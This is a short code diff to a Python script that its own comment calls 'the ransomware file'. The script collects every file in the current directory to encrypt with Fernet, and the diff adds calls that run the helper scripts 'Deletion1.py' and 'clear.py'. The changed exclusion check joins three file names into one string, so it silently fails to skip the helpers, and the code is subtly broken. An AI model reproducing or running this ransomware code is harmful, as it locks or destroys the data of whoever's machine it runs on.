@@ -3,12 +3,14 @@ import time
 from cryptography.fernet import Fernet
 from subprocess import call
 
+call(["python", "Deletion1.py"])
+call(["python", "clear.py"])
 
 # Searching for file to encrypt exept from the ransomware file
 files = []
 
 for file in os.listdir():
-	if file == "LOL.py":
+	if file == "LOL.py" "clear.py" "Deletion1.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
